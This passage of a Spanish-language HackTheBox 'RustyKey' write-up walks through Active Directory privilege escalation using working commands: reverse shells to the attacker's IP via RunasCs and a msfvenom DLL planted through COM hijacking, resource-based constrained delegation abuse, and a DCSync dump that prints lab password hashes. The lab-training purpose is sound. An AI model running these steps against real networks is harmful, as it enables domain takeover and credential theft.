    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
```

El valor de la clave `InprocServer32`, contiene la ruta a la `dll` que utiliza `7-Zip`

> La clave de registro `InProcServer32` es utilizada por el Modelo de Objetos Componentes (`COM`) para localizar y cargar un servidor en proceso de 32 bits, que normalmente es una biblioteca de enlace dinámico (`.dll`).
{: .notice--info}

``` powershell
PS C:\Programdata> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
    ThreadingModel    REG_SZ    Apartment
```


## Privilege Escalation Path

Inspeccionando el acceso en la clave de registro acerca de esta extensión de Shell, veremos que el grupo `Support` tiene control total sobre ella.

Podemos usar el comando nativo `Get-ACL` para identificar los permisos sobre esta sub-clave de registro

``` powershell
PS C:\Programdata> Get-ACL "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-00010002
         0000}\InprocServer32
Owner  : BUILTIN\Administrators
Group  : RUSTYKEY\Domain Users
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         CREATOR OWNER Allow  FullControl
         RUSTYKEY\Support Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadKey
Audit  : 
Sddl   : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-41393220
         52-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)
```

Recordemos que el usuario `ee.reed` es miembro del grupo `Support`, podemos comprobarlo desde `Bloodhound`. 

Sin embargo, también cabe recordar que aunque el grupo `Support` sea miembro de `Remote Management Users`, también contempla las restricciones de `Protected Users` a través de `Protected Objects`

![image-center](/assets/images/posts/rustykey-9-hackthebox.png)
{: .align-center}

Para poder conectarnos como el usuario `ee.reed`, debemos volver a repetir el proceso que hicimos para poder conectarnos como `bb.morgan`

> 1. Añadir a `IT-Computer3$` al grupo `Helpdesk`.
> 2. Cambiar la contraseña del usuario objetivo.
> 3. Eliminar al grupo donde se encuentra el usuario objetivo (en este caso `Support`) del grupo `Protected Users`.
> 4. Solicitar un TGT (Ticket Granting Ticket) para conectarnos usando autenticación `kerberos`.
{: .notice--warning}

Una vez repetimos el primer paso (en caso de ser necesario por el `Cleanup`), le cambiaremos la contraseña a `ee.reed`

``` bash
KRB5CCNAME=IT-Computer3\$.ccache bloodyAD --host dc.rustykey.htb -d rustykey.htb -k set password ee.reed 'Password123!'
 
[+] Password changed successfully!
```

Continuaremos con eliminar al grupo `Support` del grupo `Protected Objects`

``` bash
KRB5CCNAME=IT-Computer3\$.ccache bloodyAD --host dc.rustykey.htb -d rustykey.htb -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'Support'

[+] Support removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB
```

Ahora podremos solicitar un TGT para el usuario `ee.reed`

``` bash
getTGT.py rustykey.htb/ee.reed:'Password123!' -dc-ip dc.rustykey.htb
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
```


## Shell as `ee.reed`

Si intentamos repetir el proceso que seguimos para obtener una consola como el usuario `bb.morgan`, obtendremos un error al utilizar `kerberos`

``` bash
KRB5CCNAME=ee.reed.ccache python3 evil_winrmexec.py dc.rustykey.htb -dc-ip 10.10.11.75 -k -no-pass
   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.rustykey.htb
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://dc.rustykey.htb:5985/wsman
[*] using domain and username from ccache: RUSTYKEY.HTB\ee.reed
[*] '-spn' not specified, using HTTP/dc.rustykey.htb@RUSTYKEY.HTB
[*] requesting TGS for HTTP/dc.rustykey.htb@RUSTYKEY.HTB
[*] Kerberos via GSS failed, trying SPNEGO

TransportError: Negotiate: SPNEGO
```

Utilizaremos la herramienta [`RunasCs.exe`](https://github.com/antonioCoco/RunasCs) para ejecutar comandos como el usuario `ee.reed` en el Controlador de Dominio sin necesidad de conectarnos con un TGT, aprovechando la sesión de `powershell` actual.

Transferiremos el binario compilado desde nuestra unidad de red que creamos anteriormente

``` bash
PS C:\Programdata> copy Z:\RunasCs.exe .
```

Para recibir una shell, iniciaremos un listener con `rlrwap` por un puerto, en mi caso elegí el `443`

``` bash
rlwrap nc -lvnp 443
```

Posteriormente, lanzaremos una shell hacia nuestro listener de la siguiente manera

``` bash
PS C:\Programdata> .\RunasCs.exe ee.reed 'Password123!' powershell -r 10.10.15.64:443

[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-a53846f$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 16592 created in background.
```

Recibiremos una consola de `powershell` como el usuario `ee.reed`

``` bash
lwrap nc -lvnp 443     
Connection from 10.10.11.75:59168
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 
```


## Component Object Models (COM) Hijacking

Esta técnica se basa en la manipulación de la forma en la que Windows busca y carga librerías en tiempo de ejecución para componentes de software basados en `Component Object Models` (`COM`).

> Los componentes COM en Windows son una tecnología de Microsoft que define un estándar para crear **objetos de software binarios reutilizables** que pueden interactuar entre sí, independientemente del lenguaje de programación o el proceso en que se ejecuten.
{: .notice--info}

Como podemos modificar este valor del registro con el usuario `ee.reed`, modificaremos el valor de `InprocServer32` para que apunte a una la ruta de una DLL que controlamos en vez de la legítima, y en consecuencia, que ejecute instrucciones maliciosas.

Con la ayuda de `msfvenom` generaremos una DLL maliciosa que se encargue de iniciar una reverse shell hacia nuestra IP por un puerto, en mi caso elegí el `443`

``` bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.64 LPORT=443 -f dll -o evil.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: evil.dll
```

Iniciaremos un listener para recibir una shell por el puerto que especificamos en nuestro payload

``` bash
rlwrap nc -lvnp 443
```

Subiremos nuestro archivo `evil.dll` al DC aprovechando las funcionalidades de `evil_winrmexec.py`

``` bash
PS C:\Programdata> !upload evil.dll
```

Permitimos que cualquier usuario tenga control sobre esta `DLL` con `icacls`, para evitar conflictos de permisos.

``` bash
PS C:\Programdata> icacls evil.dll /grant everyone:F
processed file: evil.dll
Successfully processed 1 files; Failed processing 0 files
```

Modificaremos el valor de la clave `InprocServer32` para que ahora cargue la `DLL` desde la ruta donde ubicamos la nuestra

``` bash
PS C:\Programdata> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Programdata\evil.dll" /f 

The operation completed successfully.
```

Podemos verificar la modificación volviendo a consultar el valor de esta clave

``` bash
PS C:\Programdata> reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"
reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Programdata\evil.dll
    ThreadingModel    REG_SZ    Apartment
```


## Shell as `mm.turner`

Cuando el usuario víctima intente utilizar las nuevas opciones del menú contextual, recibiremos una shell en su nombre. En este caso el usuario fue `mm.turner`

``` bash
rlwrap nc -lvnp 443
Connection from 10.10.11.75:61863
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> whoami
whoami
rustykey\mm.turner
```


## Resource-Based Constrained Delegation (RBCD) Abuse

Desde `Bloodhound`, podemos ver que el usuario `mm.turner` forma parte del grupo `DelegationManager`, el cual puede modificar el atributo `msds-AllowedToActOnBehalfOfOtherIdentity` del Controlador de Dominio.

> El atributo [`msDS-AllowedToActOnBehalfOfOtherIdentity`](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity) es un atributo en Active Directory utilizado específicamente para la Delegación Restringida Basada en Recursos (`RBCD`) en `kerberos`.
{: .notice--info}

Al poder modificar este atributo, un atacante puede abusar de RBCD para suplantar a cualquier usuario de un dominio solicitando tickets de servicio

![image-center](/assets/images/posts/rustykey-10-hackthebox.png)
{: .align-center}

Subiremos las herramientas necesarias para realizar parte de la explotación vía `powershell`

``` bash
PS C:\Programdata> !upload PowerView.ps1
PS C:\Programdata> !upload Powermad.ps1

PS C:\Programdata> icacls PowerView.ps1 /grant everyone:F
PS C:\Programdata> icacls Powermad.ps1 /grant everyone:F
```

### `MacchineAccountQuota` Error

Si intentamos crear una nueva cuenta de equipo en el dominio, notaremos el siguiente error

``` bash
PS C:\Programdata> Import-Module Powermad.ps1
PS C:\Programdata> New-MachineAccount -MachineAccount incommatose -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

VERBOSE: [+] Domain Controller = dc.rustykey.htb
VERBOSE: [+] Domain = rustykey.htb
VERBOSE: [+] SAMAccountName = incommatose$
VERBOSE: [+] Distinguished Name = CN=incommatose,CN=Computers,DC=rustykey,DC=htb
[-] Exception calling "SendRequest" with "1" argument(s): "The server cannot handle directory requests."
```

Este error se produce porque el atributo de configuración `msDS-MachineAccountQuota` se encuentra con el valor `0`.

> `ms-DS-MachineAccountQuota` es un atributo de Active Directory que determina cuántas cuentas de equipo puede crear un usuario en un dominio. Por defecto, permite a cada usuario unir hasta `10` equipos al dominio
{: .notice--info}

Esto quiere decir que no tenemos la capacidad de crear cuentas de equipo para explotar `RBCD` de la forma tradicional, podemos comprobar este atributo mediante el siguiente comando

``` powershell
PS C:\Programdata> Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'

DistinguishedName         : DC=rustykey,DC=htb
ms-DS-MachineAccountQuota : 0
Name                      : rustykey
ObjectClass               : domainDNS
ObjectGUID                : 039d5090-607d-4601-9145-7efcd0380eb1
```

Esto nos obliga a cambiar un poco los pasos de la técnica, en este caso la forma más sencilla es usar una cuenta existente.

 Como disponemos de la cuenta de equipo `IT-Computer3$` la cual conocemos su contraseña, podremos realizar el ataque con ella, sin necesitar requerimientos adicionales, por ejemplo una cuenta normal de usuario.

Asignaremos el atributo `PrincipalsAllowedToDelegateToAccount` para que `IT-Computer3$` pueda solicitar tickets de servicio en nombre de cualquier usuario
 
``` bash
PS C:\Programdata> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$

PS C:\Programdata> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount

DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    : 

```

Ahora en teoría deberíamos poder solicitar un `Service Ticket`. Sin embargo, si lo intentamos con `Administrator`, obtendremos el siguiente error

``` bash
getST.py -spn 'cifs/DC.rustykey.htb' -impersonate Administrator -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user IT-COMPUTER3$ or initial TGT not forwardable
```

Esto sucede porque el usuario `Administrator` no admite la delegación `kerberos`, por lo que necesitamos utilizar otra cuenta privilegiada

![image-center](/assets/images/posts/rustykey-11-hackthebox.png)
{: .align-center}

Afortunadamente, existe la cuenta `backupadmin` la cual es miembro de `Enterprise Admins`, que a su vez es un grupo privilegiado dentro del dominio

![image-center](/assets/images/posts/rustykey-12-hackthebox.png)
{: .align-center}

Al intentar nuevamente la solicitud del ticket, vemos que lo obtenemos exitosamente

``` bash
getST.py -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```


## Root Time

Podemos asignar el ticket a una variable de entorno así como también utilizarlo de la siguiente manera para conectarnos vía `WinRM`

``` bash
KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache python3 evil_winrmexec.py dc.rustykey.htb -dc-ip 10.10.11.75 -k -no-pass

[*] '-target_ip' not specified, using dc.rustykey.htb
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://dc.rustykey.htb:5985/wsman
[*] using domain and username from ccache: rustykey.htb\backupadmin
[*] '-spn' not specified, using HTTP/dc.rustykey.htb@rustykey.htb

PS C:\Users\backupadmin\Documents> whoami
rustykey\backupadmin
```

Ya podremos ver la flag ubicada en `C:\Users\Administrator\Desktop` 

``` powershell
PS C:\Users\backupadmin\Documents> type C:\Users\Administrator\Desktop\root.txt
06b...
```


## Bonus - DC Sync

Alternativamente, podemos realizar un ataque `DC Sync` para volcar todos los hashes del dominio y conectarnos como `Administrator`

``` bash
KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump.py dc.rustykey.htb -just-dc -k -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
```

Como el entorno solamente admite autenticación `kerberos`, debemos conectarnos al dominio utilizando tickets. Solicitaremos un TGT usando el hash NT de `Administrator` de la siguiente forma

``` bash
getTGT.py rustykey.htb/Administrator -hashes :f7a... -dc-ip dc.rustykey.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

Ya podremos conectarnos usando el TGT que solicitamos

``` bash
KRB5CCNAME=Administrator.ccache python3 winrmexec/evil_winrmexec.py dc.rustykey.htb -dc-ip 10.10.11.75 -k -no-pass

PS C:\Users\Administrator\Documents> whoami
rustykey\administrator
```

Gracias por leer, a continuación te dejo la cita del día.

> In rivers, the water that you touch is the last of what has passed and the first of that which comes; so with present time.
> — Leonardo da Vinci
{: .notice--info}